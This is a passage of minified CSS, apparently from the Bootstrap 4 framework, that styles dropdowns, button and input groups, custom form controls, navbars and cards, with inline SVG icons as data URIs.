.dropdown-toggle::before{vertical-align:0}.dropdown-menu[x-placement^=bottom],.dropdown-menu[x-placement^=left],.dropdown-menu[x-placement^=right],.dropdown-menu[x-placement^=top]{right:auto;bottom:auto}.dropdown-divider{height:0;margin:.5rem 0;overflow:hidden;border-top:1px solid #e9ecef}.dropdown-item{display:block;width:100%;padding:.25rem 1.5rem;clear:both;font-weight:400;color:#212529;text-align:inherit;white-space:nowrap;background-color:transparent;border:0}.dropdown-item:focus,.dropdown-item:hover{color:#16181b;text-decoration:none;background-color:#f8f9fa}.dropdown-item.active,.dropdown-item:active{color:#fff;text-decoration:none;background-color:#007bff}.dropdown-item.disabled,.dropdown-item:disabled{color:#6c757d;pointer-events:none;background-color:transparent}.dropdown-menu.show{display:block}.dropdown-header{display:block;padding:.5rem 1.5rem;margin-bottom:0;font-size:.875rem;color:#6c757d;white-space:nowrap}.dropdown-item-text{display:block;padding:.25rem 1.5rem;color:#212529}.btn-group,.btn-group-vertical{position:relative;display:-ms-inline-flexbox;display:inline-flex;vertical-align:middle}.btn-group-vertical>.btn,.btn-group>.btn{position:relative;-ms-flex:1 1 auto;flex:1 1 auto}.btn-group-vertical>.btn:hover,.btn-group>.btn:hover{z-index:1}.btn-group-vertical>.btn.active,.btn-group-vertical>.btn:active,.btn-group-vertical>.btn:focus,.btn-group>.btn.active,.btn-group>.btn:active,.btn-group>.btn:focus{z-index:1}.btn-toolbar{display:-ms-flexbox;display:flex;-ms-flex-wrap:wrap;flex-wrap:wrap;-ms-flex-pack:start;justify-content:flex-start}.btn-toolbar .input-group{width:auto}.btn-group>.btn-group:not(:first-child),.btn-group>.btn:not(:first-child){margin-left:-1px}.btn-group>.btn-group:not(:last-child)>.btn,.btn-group>.btn:not(:last-child):not(.dropdown-toggle){border-top-right-radius:0;border-bottom-right-radius:0}.btn-group>.btn-group:not(:first-child)>.btn,.btn-group>.btn:not(:first-child){border-top-left-radius:0;border-bottom-left-radius:0}.dropdown-toggle-split{padding-right:.5625rem;padding-left:.5625rem}.dropdown-toggle-split::after,.dropright .dropdown-toggle-split::after,.dropup .dropdown-toggle-split::after{margin-left:0}.dropleft .dropdown-toggle-split::before{margin-right:0}.btn-group-sm>.btn+.dropdown-toggle-split,.btn-sm+.dropdown-toggle-split{padding-right:.375rem;padding-left:.375rem}.btn-group-lg>.btn+.dropdown-toggle-split,.btn-lg+.dropdown-toggle-split{padding-right:.75rem;padding-left:.75rem}.btn-group-vertical{-ms-flex-direction:column;flex-direction:column;-ms-flex-align:start;align-items:flex-start;-ms-flex-pack:center;justify-content:center}.btn-group-vertical>.btn,.btn-group-vertical>.btn-group{width:100%}.btn-group-vertical>.btn-group:not(:first-child),.btn-group-vertical>.btn:not(:first-child){margin-top:-1px}.btn-group-vertical>.btn-group:not(:last-child)>.btn,.btn-group-vertical>.btn:not(:last-child):not(.dropdown-toggle){border-bottom-right-radius:0;border-bottom-left-radius:0}.btn-group-vertical>.btn-group:not(:first-child)>.btn,.btn-group-vertical>.btn:not(:first-child){border-top-left-radius:0;border-top-right-radius:0}.btn-group-toggle>.btn,.btn-group-toggle>.btn-group>.btn{margin-bottom:0}.btn-group-toggle>.btn input[type=checkbox],.btn-group-toggle>.btn input[type=radio],.btn-group-toggle>.btn-group>.btn input[type=checkbox],.btn-group-toggle>.btn-group>.btn input[type=radio]{position:absolute;clip:rect(0,0,0,0);pointer-events:none}.input-group{position:relative;display:-ms-flexbox;display:flex;-ms-flex-wrap:wrap;flex-wrap:wrap;-ms-flex-align:stretch;align-items:stretch;width:100%}.input-group>.custom-file,.input-group>.custom-select,.input-group>.form-control,.input-group>.form-control-plaintext{position:relative;-ms-flex:1 1 auto;flex:1 1 auto;width:1%;min-width:0;margin-bottom:0}.input-group>.custom-file+.custom-file,.input-group>.custom-file+.custom-select,.input-group>.custom-file+.form-control,.input-group>.custom-select+.custom-file,.input-group>.custom-select+.custom-select,.input-group>.custom-select+.form-control,.input-group>.form-control+.custom-file,.input-group>.form-control+.custom-select,.input-group>.form-control+.form-control,.input-group>.form-control-plaintext+.custom-file,.input-group>.form-control-plaintext+.custom-select,.input-group>.form-control-plaintext+.form-control{margin-left:-1px}.input-group>.custom-file .custom-file-input:focus~.custom-file-label,.input-group>.custom-select:focus,.input-group>.form-control:focus{z-index:3}.input-group>.custom-file .custom-file-input:focus{z-index:4}.input-group>.custom-select:not(:last-child),.input-group>.form-control:not(:last-child){border-top-right-radius:0;border-bottom-right-radius:0}.input-group>.custom-select:not(:first-child),.input-group>.form-control:not(:first-child){border-top-left-radius:0;border-bottom-left-radius:0}.input-group>.custom-file{display:-ms-flexbox;display:flex;-ms-flex-align:center;align-items:center}.input-group>.custom-file:not(:last-child) .custom-file-label,.input-group>.custom-file:not(:last-child) .custom-file-label::after{border-top-right-radius:0;border-bottom-right-radius:0}.input-group>.custom-file:not(:first-child) .custom-file-label{border-top-left-radius:0;border-bottom-left-radius:0}.input-group-append,.input-group-prepend{display:-ms-flexbox;display:flex}.input-group-append .btn,.input-group-prepend .btn{position:relative;z-index:2}.input-group-append .btn:focus,.input-group-prepend .btn:focus{z-index:3}.input-group-append .btn+.btn,.input-group-append .btn+.input-group-text,.input-group-append .input-group-text+.btn,.input-group-append .input-group-text+.input-group-text,.input-group-prepend .btn+.btn,.input-group-prepend .btn+.input-group-text,.input-group-prepend .input-group-text+.btn,.input-group-prepend .input-group-text+.input-group-text{margin-left:-1px}.input-group-prepend{margin-right:-1px}.input-group-append{margin-left:-1px}.input-group-text{display:-ms-flexbox;display:flex;-ms-flex-align:center;align-items:center;padding:.375rem .75rem;margin-bottom:0;font-size:1rem;font-weight:400;line-height:1.5;color:#495057;text-align:center;white-space:nowrap;background-color:#e9ecef;border:1px solid #ced4da;border-radius:.25rem}.input-group-text input[type=checkbox],.input-group-text input[type=radio]{margin-top:0}.input-group-lg>.custom-select,.input-group-lg>.form-control:not(textarea){height:calc(1.5em + 1rem + 2px)}.input-group-lg>.custom-select,.input-group-lg>.form-control,.input-group-lg>.input-group-append>.btn,.input-group-lg>.input-group-append>.input-group-text,.input-group-lg>.input-group-prepend>.btn,.input-group-lg>.input-group-prepend>.input-group-text{padding:.5rem 1rem;font-size:1.25rem;line-height:1.5;border-radius:.3rem}.input-group-sm>.custom-select,.input-group-sm>.form-control:not(textarea){height:calc(1.5em + .5rem + 2px)}.input-group-sm>.custom-select,.input-group-sm>.form-control,.input-group-sm>.input-group-append>.btn,.input-group-sm>.input-group-append>.input-group-text,.input-group-sm>.input-group-prepend>.btn,.input-group-sm>.input-group-prepend>.input-group-text{padding:.25rem .5rem;font-size:.875rem;line-height:1.5;border-radius:.2rem}.input-group-lg>.custom-select,.input-group-sm>.custom-select{padding-right:1.75rem}.input-group>.input-group-append:last-child>.btn:not(:last-child):not(.dropdown-toggle),.input-group>.input-group-append:last-child>.input-group-text:not(:last-child),.input-group>.input-group-append:not(:last-child)>.btn,.input-group>.input-group-append:not(:last-child)>.input-group-text,.input-group>.input-group-prepend>.btn,.input-group>.input-group-prepend>.input-group-text{border-top-right-radius:0;border-bottom-right-radius:0}.input-group>.input-group-append>.btn,.input-group>.input-group-append>.input-group-text,.input-group>.input-group-prepend:first-child>.btn:not(:first-child),.input-group>.input-group-prepend:first-child>.input-group-text:not(:first-child),.input-group>.input-group-prepend:not(:first-child)>.btn,.input-group>.input-group-prepend:not(:first-child)>.input-group-text{border-top-left-radius:0;border-bottom-left-radius:0}.custom-control{position:relative;z-index:1;display:block;min-height:1.5rem;padding-left:1.5rem;-webkit-print-color-adjust:exact;color-adjust:exact}.custom-control-inline{display:-ms-inline-flexbox;display:inline-flex;margin-right:1rem}.custom-control-input{position:absolute;left:0;z-index:-1;width:1rem;height:1.25rem;opacity:0}.custom-control-input:checked~.custom-control-label::before{color:#fff;border-color:#007bff;background-color:#007bff}.custom-control-input:focus~.custom-control-label::before{box-shadow:0 0 0 .2rem rgba(0,123,255,.25)}.custom-control-input:focus:not(:checked)~.custom-control-label::before{border-color:#80bdff}.custom-control-input:not(:disabled):active~.custom-control-label::before{color:#fff;background-color:#b3d7ff;border-color:#b3d7ff}.custom-control-input:disabled~.custom-control-label,.custom-control-input[disabled]~.custom-control-label{color:#6c757d}.custom-control-input:disabled~.custom-control-label::before,.custom-control-input[disabled]~.custom-control-label::before{background-color:#e9ecef}.custom-control-label{position:relative;margin-bottom:0;vertical-align:top}.custom-control-label::before{position:absolute;top:.25rem;left:-1.5rem;display:block;width:1rem;height:1rem;pointer-events:none;content:"";background-color:#fff;border:#adb5bd solid 1px}.custom-control-label::after{position:absolute;top:.25rem;left:-1.5rem;display:block;width:1rem;height:1rem;content:"";background:no-repeat 50%/50% 50%}.custom-checkbox .custom-control-label::before{border-radius:.25rem}.custom-checkbox .custom-control-input:checked~.custom-control-label::after{background-image:url("data:image/svg+xml,%3csvg xmlns='http://www.w3.org/2000/svg' width='8' height='8' viewBox='0 0 8 8'%3e%3cpath fill='%23fff' d='M6.564.75l-3.59 3.612-1.538-1.55L0 4.26l2.974 2.99L8 2.193z'/%3e%3c/svg%3e")}.custom-checkbox .custom-control-input:indeterminate~.custom-control-label::before{border-color:#007bff;background-color:#007bff}.custom-checkbox .custom-control-input:indeterminate~.custom-control-label::after{background-image:url("data:image/svg+xml,%3csvg xmlns='http://www.w3.org/2000/svg' width='4' height='4' viewBox='0 0 4 4'%3e%3cpath stroke='%23fff' d='M0 2h4'/%3e%3c/svg%3e")}.custom-checkbox .custom-control-input:disabled:checked~.custom-control-label::before{background-color:rgba(0,123,255,.5)}.custom-checkbox .custom-control-input:disabled:indeterminate~.custom-control-label::before{background-color:rgba(0,123,255,.5)}.custom-radio .custom-control-label::before{border-radius:50%}.custom-radio .custom-control-input:checked~.custom-control-label::after{background-image:url("data:image/svg+xml,%3csvg xmlns='http://www.w3.org/2000/svg' width='12' height='12' viewBox='-4 -4 8 8'%3e%3ccircle r='3' fill='%23fff'/%3e%3c/svg%3e")}.custom-radio .custom-control-input:disabled:checked~.custom-control-label::before{background-color:rgba(0,123,255,.5)}.custom-switch{padding-left:2.25rem}.custom-switch .custom-control-label::before{left:-2.25rem;width:1.75rem;pointer-events:all;border-radius:.5rem}.custom-switch .custom-control-label::after{top:calc(.25rem + 2px);left:calc(-2.25rem + 2px);width:calc(1rem - 4px);height:calc(1rem - 4px);background-color:#adb5bd;border-radius:.5rem;transition:background-color .15s ease-in-out,border-color .15s ease-in-out,box-shadow .15s ease-in-out,-webkit-transform .15s ease-in-out;transition:transform .15s ease-in-out,background-color .15s ease-in-out,border-color .15s ease-in-out,box-shadow .15s ease-in-out;transition:transform .15s ease-in-out,background-color .15s ease-in-out,border-color .15s ease-in-out,box-shadow .15s ease-in-out,-webkit-transform .15s ease-in-out}@media (prefers-reduced-motion:reduce){.custom-switch .custom-control-label::after{transition:none}}.custom-switch .custom-control-input:checked~.custom-control-label::after{background-color:#fff;-webkit-transform:translateX(.75rem);transform:translateX(.75rem)}.custom-switch .custom-control-input:disabled:checked~.custom-control-label::before{background-color:rgba(0,123,255,.5)}.custom-select{display:inline-block;width:100%;height:calc(1.5em + .75rem + 2px);padding:.375rem 1.75rem .375rem .75rem;font-size:1rem;font-weight:400;line-height:1.5;color:#495057;vertical-align:middle;background:#fff url("data:image/svg+xml,%3csvg xmlns='http://www.w3.org/2000/svg' width='4' height='5' viewBox='0 0 4 5'%3e%3cpath fill='%23343a40' d='M2 0L0 2h4zm0 5L0 3h4z'/%3e%3c/svg%3e") no-repeat right .75rem center/8px 10px;border:1px solid #ced4da;border-radius:.25rem;-webkit-appearance:none;-moz-appearance:none;appearance:none}.custom-select:focus{border-color:#80bdff;outline:0;box-shadow:0 0 0 .2rem rgba(0,123,255,.25)}.custom-select:focus::-ms-value{color:#495057;background-color:#fff}.custom-select[multiple],.custom-select[size]:not([size="1"]){height:auto;padding-right:.75rem;background-image:none}.custom-select:disabled{color:#6c757d;background-color:#e9ecef}.custom-select::-ms-expand{display:none}.custom-select:-moz-focusring{color:transparent;text-shadow:0 0 0 #495057}.custom-select-sm{height:calc(1.5em + .5rem + 2px);padding-top:.25rem;padding-bottom:.25rem;padding-left:.5rem;font-size:.875rem}.custom-select-lg{height:calc(1.5em + 1rem + 2px);padding-top:.5rem;padding-bottom:.5rem;padding-left:1rem;font-size:1.25rem}.custom-file{position:relative;display:inline-block;width:100%;height:calc(1.5em + .75rem + 2px);margin-bottom:0}.custom-file-input{position:relative;z-index:2;width:100%;height:calc(1.5em + .75rem + 2px);margin:0;opacity:0}.custom-file-input:focus~.custom-file-label{border-color:#80bdff;box-shadow:0 0 0 .2rem rgba(0,123,255,.25)}.custom-file-input:disabled~.custom-file-label,.custom-file-input[disabled]~.custom-file-label{background-color:#e9ecef}.custom-file-input:lang(en)~.custom-file-label::after{content:"Browse"}.custom-file-input~.custom-file-label[data-browse]::after{content:attr(data-browse)}.custom-file-label{position:absolute;top:0;right:0;left:0;z-index:1;height:calc(1.5em + .75rem + 2px);padding:.375rem .75rem;font-weight:400;line-height:1.5;color:#495057;background-color:#fff;border:1px solid #ced4da;border-radius:.25rem}.custom-file-label::after{position:absolute;top:0;right:0;bottom:0;z-index:3;display:block;height:calc(1.5em + .75rem);padding:.375rem .75rem;line-height:1.5;color:#495057;content:"Browse";background-color:#e9ecef;border-left:inherit;border-radius:0 .25rem .25rem 0}.custom-range{width:100%;height:1.4rem;padding:0;background-color:transparent;-webkit-appearance:none;-moz-appearance:none;appearance:none}.custom-range:focus{outline:0}.custom-range:focus::-webkit-slider-thumb{box-shadow:0 0 0 1px #fff,0 0 0 .2rem rgba(0,123,255,.25)}.custom-range:focus::-moz-range-thumb{box-shadow:0 0 0 1px #fff,0 0 0 .2rem rgba(0,123,255,.25)}.custom-range:focus::-ms-thumb{box-shadow:0 0 0 1px #fff,0 0 0 .2rem rgba(0,123,255,.25)}.custom-range::-moz-focus-outer{border:0}.custom-range::-webkit-slider-thumb{width:1rem;height:1rem;margin-top:-.25rem;background-color:#007bff;border:0;border-radius:1rem;-webkit-transition:background-color .15s ease-in-out,border-color .15s ease-in-out,box-shadow .15s ease-in-out;transition:background-color .15s ease-in-out,border-color .15s ease-in-out,box-shadow .15s ease-in-out;-webkit-appearance:none;appearance:none}@media (prefers-reduced-motion:reduce){.custom-range::-webkit-slider-thumb{-webkit-transition:none;transition:none}}.custom-range::-webkit-slider-thumb:active{background-color:#b3d7ff}.custom-range::-webkit-slider-runnable-track{width:100%;height:.5rem;color:transparent;cursor:pointer;background-color:#dee2e6;border-color:transparent;border-radius:1rem}.custom-range::-moz-range-thumb{width:1rem;height:1rem;background-color:#007bff;border:0;border-radius:1rem;-moz-transition:background-color .15s ease-in-out,border-color .15s ease-in-out,box-shadow .15s ease-in-out;transition:background-color .15s ease-in-out,border-color .15s ease-in-out,box-shadow .15s ease-in-out;-moz-appearance:none;appearance:none}@media (prefers-reduced-motion:reduce){.custom-range::-moz-range-thumb{-moz-transition:none;transition:none}}.custom-range::-moz-range-thumb:active{background-color:#b3d7ff}.custom-range::-moz-range-track{width:100%;height:.5rem;color:transparent;cursor:pointer;background-color:#dee2e6;border-color:transparent;border-radius:1rem}.custom-range::-ms-thumb{width:1rem;height:1rem;margin-top:0;margin-right:.2rem;margin-left:.2rem;background-color:#007bff;border:0;border-radius:1rem;-ms-transition:background-color .15s ease-in-out,border-color .15s ease-in-out,box-shadow .15s ease-in-out;transition:background-color .15s ease-in-out,border-color .15s ease-in-out,box-shadow .15s ease-in-out;appearance:none}@media (prefers-reduced-motion:reduce){.custom-range::-ms-thumb{-ms-transition:none;transition:none}}.custom-range::-ms-thumb:active{background-color:#b3d7ff}.custom-range::-ms-track{width:100%;height:.5rem;color:transparent;cursor:pointer;background-color:transparent;border-color:transparent;border-width:.5rem}.custom-range::-ms-fill-lower{background-color:#dee2e6;border-radius:1rem}.custom-range::-ms-fill-upper{margin-right:15px;background-color:#dee2e6;border-radius:1rem}.custom-range:disabled::-webkit-slider-thumb{background-color:#adb5bd}.custom-range:disabled::-webkit-slider-runnable-track{cursor:default}.custom-range:disabled::-moz-range-thumb{background-color:#adb5bd}.custom-range:disabled::-moz-range-track{cursor:default}.custom-range:disabled::-ms-thumb{background-color:#adb5bd}.custom-control-label::before,.custom-file-label,.custom-select{transition:background-color .15s ease-in-out,border-color .15s ease-in-out,box-shadow .15s ease-in-out}@media (prefers-reduced-motion:reduce){.custom-control-label::before,.custom-file-label,.custom-select{transition:none}}.nav{display:-ms-flexbox;display:flex;-ms-flex-wrap:wrap;flex-wrap:wrap;padding-left:0;margin-bottom:0;list-style:none}.nav-link{display:block;padding:.5rem 1rem}.nav-link:focus,.nav-link:hover{text-decoration:none}.nav-link.disabled{color:#6c757d;pointer-events:none;cursor:default}.nav-tabs{border-bottom:1px solid #dee2e6}.nav-tabs .nav-item{margin-bottom:-1px}.nav-tabs .nav-link{border:1px solid transparent;border-top-left-radius:.25rem;border-top-right-radius:.25rem}.nav-tabs .nav-link:focus,.nav-tabs .nav-link:hover{border-color:#e9ecef #e9ecef #dee2e6}.nav-tabs .nav-link.disabled{color:#6c757d;background-color:transparent;border-color:transparent}.nav-tabs .nav-item.show .nav-link,.nav-tabs .nav-link.active{color:#495057;background-color:#fff;border-color:#dee2e6 #dee2e6 #fff}.nav-tabs .dropdown-menu{margin-top:-1px;border-top-left-radius:0;border-top-right-radius:0}.nav-pills .nav-link{border-radius:.25rem}.nav-pills .nav-link.active,.nav-pills .show>.nav-link{color:#fff;background-color:#007bff}.nav-fill .nav-item,.nav-fill>.nav-link{-ms-flex:1 1 auto;flex:1 1 auto;text-align:center}.nav-justified .nav-item,.nav-justified>.nav-link{-ms-flex-preferred-size:0;flex-basis:0;-ms-flex-positive:1;flex-grow:1;text-align:center}.tab-content>.tab-pane{display:none}.tab-content>.active{display:block}.navbar{position:relative;display:-ms-flexbox;display:flex;-ms-flex-wrap:wrap;flex-wrap:wrap;-ms-flex-align:center;align-items:center;-ms-flex-pack:justify;justify-content:space-between;padding:.5rem 1rem}.navbar .container,.navbar .container-fluid,.navbar .container-lg,.navbar .container-md,.navbar .container-sm,.navbar .container-xl{display:-ms-flexbox;display:flex;-ms-flex-wrap:wrap;flex-wrap:wrap;-ms-flex-align:center;align-items:center;-ms-flex-pack:justify;justify-content:space-between}.navbar-brand{display:inline-block;padding-top:.3125rem;padding-bottom:.3125rem;margin-right:1rem;font-size:1.25rem;line-height:inherit;white-space:nowrap}.navbar-brand:focus,.navbar-brand:hover{text-decoration:none}.navbar-nav{display:-ms-flexbox;display:flex;-ms-flex-direction:column;flex-direction:column;padding-left:0;margin-bottom:0;list-style:none}.navbar-nav .nav-link{padding-right:0;padding-left:0}.navbar-nav .dropdown-menu{position:static;float:none}.navbar-text{display:inline-block;padding-top:.5rem;padding-bottom:.5rem}.navbar-collapse{-ms-flex-preferred-size:100%;flex-basis:100%;-ms-flex-positive:1;flex-grow:1;-ms-flex-align:center;align-items:center}.navbar-toggler{padding:.25rem .75rem;font-size:1.25rem;line-height:1;background-color:transparent;border:1px solid transparent;border-radius:.25rem}.navbar-toggler:focus,.navbar-toggler:hover{text-decoration:none}.navbar-toggler-icon{display:inline-block;width:1.5em;height:1.5em;vertical-align:middle;content:"";background:no-repeat center center;background-size:100% 100%}@media (max-width:575.98px){.navbar-expand-sm>.container,.navbar-expand-sm>.container-fluid,.navbar-expand-sm>.container-lg,.navbar-expand-sm>.container-md,.navbar-expand-sm>.container-sm,.navbar-expand-sm>.container-xl{padding-right:0;padding-left:0}}@media (min-width:576px){.navbar-expand-sm{-ms-flex-flow:row nowrap;flex-flow:row nowrap;-ms-flex-pack:start;justify-content:flex-start}.navbar-expand-sm .navbar-nav{-ms-flex-direction:row;flex-direction:row}.navbar-expand-sm .navbar-nav .dropdown-menu{position:absolute}.navbar-expand-sm .navbar-nav .nav-link{padding-right:.5rem;padding-left:.5rem}.navbar-expand-sm>.container,.navbar-expand-sm>.container-fluid,.navbar-expand-sm>.container-lg,.navbar-expand-sm>.container-md,.navbar-expand-sm>.container-sm,.navbar-expand-sm>.container-xl{-ms-flex-wrap:nowrap;flex-wrap:nowrap}.navbar-expand-sm .navbar-collapse{display:-ms-flexbox!important;display:flex!important;-ms-flex-preferred-size:auto;flex-basis:auto}.navbar-expand-sm .navbar-toggler{display:none}}@media (max-width:767.98px){.navbar-expand-md>.container,.navbar-expand-md>.container-fluid,.navbar-expand-md>.container-lg,.navbar-expand-md>.container-md,.navbar-expand-md>.container-sm,.navbar-expand-md>.container-xl{padding-right:0;padding-left:0}}@media (min-width:768px){.navbar-expand-md{-ms-flex-flow:row nowrap;flex-flow:row nowrap;-ms-flex-pack:start;justify-content:flex-start}.navbar-expand-md .navbar-nav{-ms-flex-direction:row;flex-direction:row}.navbar-expand-md .navbar-nav .dropdown-menu{position:absolute}.navbar-expand-md .navbar-nav .nav-link{padding-right:.5rem;padding-left:.5rem}.navbar-expand-md>.container,.navbar-expand-md>.container-fluid,.navbar-expand-md>.container-lg,.navbar-expand-md>.container-md,.navbar-expand-md>.container-sm,.navbar-expand-md>.container-xl{-ms-flex-wrap:nowrap;flex-wrap:nowrap}.navbar-expand-md .navbar-collapse{display:-ms-flexbox!important;display:flex!important;-ms-flex-preferred-size:auto;flex-basis:auto}.navbar-expand-md .navbar-toggler{display:none}}@media (max-width:991.98px){.navbar-expand-lg>.container,.navbar-expand-lg>.container-fluid,.navbar-expand-lg>.container-lg,.navbar-expand-lg>.container-md,.navbar-expand-lg>.container-sm,.navbar-expand-lg>.container-xl{padding-right:0;padding-left:0}}@media (min-width:992px){.navbar-expand-lg{-ms-flex-flow:row nowrap;flex-flow:row nowrap;-ms-flex-pack:start;justify-content:flex-start}.navbar-expand-lg .navbar-nav{-ms-flex-direction:row;flex-direction:row}.navbar-expand-lg .navbar-nav .dropdown-menu{position:absolute}.navbar-expand-lg .navbar-nav .nav-link{padding-right:.5rem;padding-left:.5rem}.navbar-expand-lg>.container,.navbar-expand-lg>.container-fluid,.navbar-expand-lg>.container-lg,.navbar-expand-lg>.container-md,.navbar-expand-lg>.container-sm,.navbar-expand-lg>.container-xl{-ms-flex-wrap:nowrap;flex-wrap:nowrap}.navbar-expand-lg .navbar-collapse{display:-ms-flexbox!important;display:flex!important;-ms-flex-preferred-size:auto;flex-basis:auto}.navbar-expand-lg .navbar-toggler{display:none}}@media (max-width:1199.98px){.navbar-expand-xl>.container,.navbar-expand-xl>.container-fluid,.navbar-expand-xl>.container-lg,.navbar-expand-xl>.container-md,.navbar-expand-xl>.container-sm,.navbar-expand-xl>.container-xl{padding-right:0;padding-left:0}}@media (min-width:1200px){.navbar-expand-xl{-ms-flex-flow:row nowrap;flex-flow:row nowrap;-ms-flex-pack:start;justify-content:flex-start}.navbar-expand-xl .navbar-nav{-ms-flex-direction:row;flex-direction:row}.navbar-expand-xl .navbar-nav .dropdown-menu{position:absolute}.navbar-expand-xl .navbar-nav .nav-link{padding-right:.5rem;padding-left:.5rem}.navbar-expand-xl>.container,.navbar-expand-xl>.container-fluid,.navbar-expand-xl>.container-lg,.navbar-expand-xl>.container-md,.navbar-expand-xl>.container-sm,.navbar-expand-xl>.container-xl{-ms-flex-wrap:nowrap;flex-wrap:nowrap}.navbar-expand-xl .navbar-collapse{display:-ms-flexbox!important;display:flex!important;-ms-flex-preferred-size:auto;flex-basis:auto}.navbar-expand-xl .navbar-toggler{display:none}}.navbar-expand{-ms-flex-flow:row nowrap;flex-flow:row nowrap;-ms-flex-pack:start;justify-content:flex-start}.navbar-expand>.container,.navbar-expand>.container-fluid,.navbar-expand>.container-lg,.navbar-expand>.container-md,.navbar-expand>.container-sm,.navbar-expand>.container-xl{padding-right:0;padding-left:0}.navbar-expand .navbar-nav{-ms-flex-direction:row;flex-direction:row}.navbar-expand .navbar-nav .dropdown-menu{position:absolute}.navbar-expand .navbar-nav .nav-link{padding-right:.5rem;padding-left:.5rem}.navbar-expand>.container,.navbar-expand>.container-fluid,.navbar-expand>.container-lg,.navbar-expand>.container-md,.navbar-expand>.container-sm,.navbar-expand>.container-xl{-ms-flex-wrap:nowrap;flex-wrap:nowrap}.navbar-expand .navbar-collapse{display:-ms-flexbox!important;display:flex!important;-ms-flex-preferred-size:auto;flex-basis:auto}.navbar-expand .navbar-toggler{display:none}.navbar-light .navbar-brand{color:rgba(0,0,0,.9)}.navbar-light .navbar-brand:focus,.navbar-light .navbar-brand:hover{color:rgba(0,0,0,.9)}.navbar-light .navbar-nav .nav-link{color:rgba(0,0,0,.5)}.navbar-light .navbar-nav .nav-link:focus,.navbar-light .navbar-nav .nav-link:hover{color:rgba(0,0,0,.7)}.navbar-light .navbar-nav .nav-link.disabled{color:rgba(0,0,0,.3)}.navbar-light .navbar-nav .active>.nav-link,.navbar-light .navbar-nav .nav-link.active,.navbar-light .navbar-nav .nav-link.show,.navbar-light .navbar-nav .show>.nav-link{color:rgba(0,0,0,.9)}.navbar-light .navbar-toggler{color:rgba(0,0,0,.5);border-color:rgba(0,0,0,.1)}.navbar-light .navbar-toggler-icon{background-image:url("data:image/svg+xml,%3csvg xmlns='http://www.w3.org/2000/svg' width='30' height='30' viewBox='0 0 30 30'%3e%3cpath stroke='rgba%280, 0, 0, 0.5%29' stroke-linecap='round' stroke-miterlimit='10' stroke-width='2' d='M4 7h22M4 15h22M4 23h22'/%3e%3c/svg%3e")}.navbar-light .navbar-text{color:rgba(0,0,0,.5)}.navbar-light .navbar-text a{color:rgba(0,0,0,.9)}.navbar-light .navbar-text a:focus,.navbar-light .navbar-text a:hover{color:rgba(0,0,0,.9)}.navbar-dark .navbar-brand{color:#fff}.navbar-dark .navbar-brand:focus,.navbar-dark .navbar-brand:hover{color:#fff}.navbar-dark .navbar-nav .nav-link{color:rgba(255,255,255,.5)}.navbar-dark .navbar-nav .nav-link:focus,.navbar-dark .navbar-nav .nav-link:hover{color:rgba(255,255,255,.75)}.navbar-dark .navbar-nav .nav-link.disabled{color:rgba(255,255,255,.25)}.navbar-dark .navbar-nav .active>.nav-link,.navbar-dark .navbar-nav .nav-link.active,.navbar-dark .navbar-nav .nav-link.show,.navbar-dark .navbar-nav .show>.nav-link{color:#fff}.navbar-dark .navbar-toggler{color:rgba(255,255,255,.5);border-color:rgba(255,255,255,.1)}.navbar-dark .navbar-toggler-icon{background-image:url("data:image/svg+xml,%3csvg xmlns='http://www.w3.org/2000/svg' width='30' height='30' viewBox='0 0 30 30'%3e%3cpath stroke='rgba%28255, 255, 255, 0.5%29' stroke-linecap='round' stroke-miterlimit='10' stroke-width='2' d='M4 7h22M4 15h22M4 23h22'/%3e%3c/svg%3e")}.navbar-dark .navbar-text{color:rgba(255,255,255,.5)}.navbar-dark .navbar-text a{color:#fff}.navbar-dark .navbar-text a:focus,.navbar-dark .navbar-text a:hover{color:#fff}.card{position:relative;display:-ms-flexbox;display:flex;-ms-flex-direction:column;flex-direction:column;min-width:0;word-wrap:break-word;background-color:#fff;background-clip:border-box;border:1px solid rgba(0,0,0,.125);border-radius:.25rem}.card>hr{margin-right:0;margin-left:0}.card>.list-group{border-top:inherit;border-bottom:inherit}.card>.list-group:first-child{border-top-width:0;border-top-left-radius:calc(.25rem - 1px);border-top-right-radius:calc(.25rem - 1px)}.card>.list-group:last-child{border-bottom-width:0;border-bottom-right-radius:calc(.25rem - 1px);border-bottom-left-radius:calc(.25rem - 1px)}.card>.card-header+.list-group,.card>.list-group+.card-footer{border-top:0}.card-body{-ms-flex:1 1 auto;flex:1 1 auto;min-height:1px;padding:1.25rem}.card-title{margin-bottom:.75rem}.card-subtitle{margin-top:-.375rem;margin-bottom:0}.card-text:last-child{margin-bottom:0}.card-link:hover{text-decoration:none}.card-link+.card-link{margin-left:1.25rem}.card-header{padding:.75rem 1.25rem;margin-bottom:0;background-color:rgba(0,0,0,.03);border-bottom:1px solid rgba(0,0,0,.125)}.card-header:first-child{border-radius:calc(.25rem - 1px) calc(.25rem - 1px) 0 0}.card-footer{padding:.75rem 1.25rem;background-color:rgba(0,0,0,.03);border-top:1px solid rgba(0,0,0,.125)}.card-footer:last-child{border-radius:0 0 calc(.25rem - 1px) calc(.25rem - 1px)}.card-header-tabs{margin-right:-.625rem;margin-bottom:-.75rem;margin-left:-.625rem;border-bottom:0}.card-header-pills{margin-right:-.625rem;margin-left:-.625rem}.card-img-overlay{position:absolute;top:0;right:0;bottom:0;left:0;padding:1.25rem;border-radius:calc(.25rem - 1px)}.card-img,.card-img-bottom,.card-img-top{-ms-flex-negative:0;flex-shrink:0;width:100%}.card-img,.card-img-top{border-top-left-radius:calc(.25rem - 1px);border-top-right-radius:calc(.25rem - 1px)}.card-img,.card-img-bottom{border-bottom-right-radius:calc(.25rem - 1px);border-bottom-left-radius:calc(.25rem - 1px)}.card-deck .card{margin-bottom:15px}@media (min-width:576px){.card-deck{display:-ms-flexbox;display:flex;-ms-flex-flow:row wrap;flex-flow:row wrap;margin-right:-15px;margin-left:-15px}.card-deck .card{-ms-flex:1 0 0%;flex:1 0 0%;margin-right:15px;margin-bottom:0;margin-left:15px}}.card-group>.card{margin-bottom:15px}@media (min-width:576px){.card-group{display:-ms-flexbox;display:flex;-ms-flex-flow:row wrap;flex-flow:row wrap}.card-group>.card{-ms-flex:1 0 0%;flex:1 0 0%;margin-bottom:0}.card-group>.card+.card{margin-left:0;border-left:0}.card-group>.card:not(:last-child){border-top-right-radius:0;border-bottom-right-radius:0}.card-group>.card:not(:last-child) .card-header,.card-group>.card:not(:last-child) .card-img-top{border-top-right-radius:0}.card-group>.card:not(:last-child) .card-footer,.card-group>.card:not(:last-child) .card-img-bottom{border-bottom-right-radius:0}.card-group>.card:not(:first-child){border-top-left-radius:0;border-bottom-left-radius:0}.card-group>.card:not(:first-child) 